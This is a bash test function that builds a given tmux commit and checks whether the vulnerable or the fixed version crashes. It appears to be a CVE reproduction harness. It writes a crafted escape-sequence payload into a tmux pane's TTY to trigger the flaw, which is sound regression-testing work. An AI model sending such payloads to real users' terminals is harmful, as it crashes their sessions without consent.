#!/usr/bin/env bash
set -euo pipefail

# Function to run a tmux CVE test
# Arguments:
#   $1: Git commit hash to checkout
#   $2: Description of the version (e.g., "vulnerable version", "fixed version")
#   $3: Expected outcome (e.g., "Expecting a crash", "Expecting NO crash")
#   $4: Timeout in seconds (optional, defaults to 60 seconds)
run_tmux_test() {
  local commit_hash="$1"
  local version_description="$2"
  local expected_outcome="$3"
  local timeout_duration="${4:-60}" # Default to 60 seconds

  echo "=========================================="
  echo "Testing ${version_description} (${commit_hash})"
  echo "=========================================="

  echo "Current directory: $(pwd)"
  echo "Fetching latest tags and objects from origin..."
  if ! git fetch origin --tags --prune; then
    echo "WARNING: git fetch origin --tags failed. Proceeding with reset attempt anyway."
  fi

  echo "Attempting to reset to commit: ${commit_hash}"
  if ! git reset --hard "${commit_hash}"; then
    echo "ERROR: Failed to reset to commit ${commit_hash}."
    echo "Available tags:"
    git tag -l | sort -V
    echo "Recent log:"
    git log -n 10 --oneline
    return 1
  fi
  echo "Successfully reset to commit ${commit_hash}."

  # Build tmux from source
  echo "Building tmux from source..."
  if [ ! -f "autogen.sh" ]; then
    echo "ERROR: autogen.sh NOT FOUND in $(pwd) after git reset."
    echo "Please check the specific commit to ensure autogen.sh is present at the root."
    return 1
  fi

  echo "Attempting to run: sh autogen.sh && ./configure && make check && make install"
  if sh autogen.sh && ./configure && make check && make install; then
    echo "Build complete."
  else
    echo "ERROR: Build FAILED. This could be due to issues running autogen.sh, configure, or make."
    return 1
  fi
  TMUX_BIN_PATH='/usr/bin/tmux' # path where tmux is stored after installation
  echo -e "\n--- Running ${version_description} and attempting to trigger CVE ---"
  echo "${expected_outcome}"

  ./tmux &
  TMUX_PID=$!
  echo "tmux started with PID: $TMUX_PID"

  sleep 2 # Wait for tmux to start

  local pane_tty_path
  # Try to find the pane TTY
  for _ in $( # Try for up to 2.5 seconds
    seq 1 5
  ); do
    pane_tty_path=$(tmux list-panes -F '#{pane_tty}' 2>/dev/null | grep -oP '/dev/pts/\d+' | head -n 1)
    if [ -n "$pane_tty_path" ] && [ -e "$pane_tty_path" ]; then
      break
    fi
    sleep 0.5
  done

  if [ -n "$pane_tty_path" ] && [ -e "$pane_tty_path" ]; then
    echo "Sending payload to tmux pane: $pane_tty_path"
    echo -e '\033[::::::7::1:2:3::5:6:7:m' >"$pane_tty_path"
    sleep 1
  else
    echo "WARNING: Could not find active tmux pane TTY. Payload not sent."
  fi

  echo -e "\n--- Payload possibly sent. Waiting for tmux process (PID: $TMUX_PID) with timeout of ${timeout_duration}s ---"

  # Timeout subshell
  (sleep "$timeout_duration" && kill "$TMUX_PID" 2>/dev/null && echo "INFO: tmux (PID: $TMUX_PID) timed out after ${timeout_duration}s and was sent SIGTERM by monitor.") &
  TIMEOUT_MONITOR_PID=$!

  # Wait for TMUX_PID to exit
  wait "$TMUX_PID" 2>/dev/null
  TMUX_EXIT_CODE=$?

  # Clean up the timeout monitor
  kill "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1
  wait "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1

  # Report tmux exit status
  if [ "$TMUX_EXIT_CODE" -eq 0 ]; then
    echo "tmux (PID: $TMUX_PID) exited cleanly (Code: 0)."
  elif [ "$TMUX_EXIT_CODE" -gt 128 ]; then
    SIGNAL_NUMBER=$((TMUX_EXIT_CODE - 128))
    signal_name=""
    if command -v kill >/dev/null && kill -l "$SIGNAL_NUMBER" >/dev/null 2>&1; then
      signal_name=" ($(kill -l "$SIGNAL_NUMBER" 2>/dev/null || echo Signal $SIGNAL_NUMBER))"
    fi
    echo "tmux (PID: $TMUX_PID) was terminated by signal $SIGNAL_NUMBER${signal_name} (Exit Code: $TMUX_EXIT_CODE)."
    if [[ "$TIMEOUT_MONITOR_PID" && ! $(ps -p $TIMEOUT_MONITOR_PID -o comm=) ]]; then # Check if monitor is gone (implies it might have killed tmux)
      echo "This termination might be due to the script's timeout mechanism."
    fi
  else
    echo "tmux (PID: $TMUX_PID) exited with code $TMUX_EXIT_CODE."
  fi

  echo -e "\n--- ${version_description} test complete. ---"
  return 0
}
